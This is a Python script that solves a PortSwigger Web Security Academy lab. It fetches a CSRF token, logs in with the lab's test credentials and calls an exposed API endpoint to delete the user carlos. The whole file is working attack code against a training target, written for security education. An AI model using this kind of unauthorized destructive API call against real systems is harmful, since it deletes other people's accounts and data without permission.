# Testing on Portswigger Academy Lab - API Testing - Lab: Exploiting an API endpoint using documentation
# To solve the lab, find the exposed API documentation and delete carlos. You can log in to your own account using the following credentials: wiener:peter.
# Credit: Kestrel.hzl

from urllib import response
import requests
import sys
from bs4 import BeautifulSoup

args = sys.argv[1:]

#if len(sys.argv)<4:
#    print("python3 login.py <base_url> <username> <password>")
#    print("Username = wiener")
#    print("Password = peter")
#    sys.exit(1)

#base_url = args[0]
#username = args[1]
#password = args[2]

if len(sys.argv)<2:
    print("\nUsage:\npython3 login.py <base_url>\n")
    print("Example: python3 login.py https://0a5900d80378f12686cae9f7004300d2.web-security-academy.net\n")
    sys.exit(1)

base_url = args[0]
username = "wiener"
password = "peter"

login_url = base_url + "/login"

# Get the CSRF Token
def get_csrf_token(login_url, session):

    print("> Getting CSRF_Token")

    response = session.get(login_url)

    if response.status_code == 200:

        soup = BeautifulSoup(response.text, "html.parser")
        csrf_input = soup.find("input", {"name": "csrf"})

        if csrf_input:
            csrf_token = csrf_input["value"]
            return csrf_token
        
        else:
            print("[!] CSRF Token not found.")
            return None, None
    
    else:
        print("[!] Web Request Error.")
        return None

# Perform Login
def login(login_url, username, password, csrf_token, session):

    print("> Logining")
    
    data = "csrf=" + csrf_token + "&username=" + username + "&password=" + password

    response = session.post(login_url, data=data)

    if response.status_code == 200:
        if "Invalid username or password" not in response.text:
            print("login successfully")
            print("Login Cookie: session =",session.cookies.get('session'))
        else:
            print("Error credential.")

    else:
        print("[!] login failed.")
        print(response.status_code)


# Delete User (carlos)
def delete_user(session):

    print("> Deleting user carlos")

    delete_api = base_url + "/api/user/carlos"
    response = session.delete(delete_api)
    
    if response.status_code == 200:
        print("Done.")
        #print(response.text)

    else:
        print("Error to Delete User.")
        
        if "User not found" in response.text:
            print("User Carlos not found.")




# Create Session
session = requests.session()

csrf_token = get_csrf_token(login_url, session)

if csrf_token:
    print("CSRF_Token: ",csrf_token)

    login(login_url, username, password, csrf_token, session)

    delete_user(session)
    
else:
    sys.exit(1)
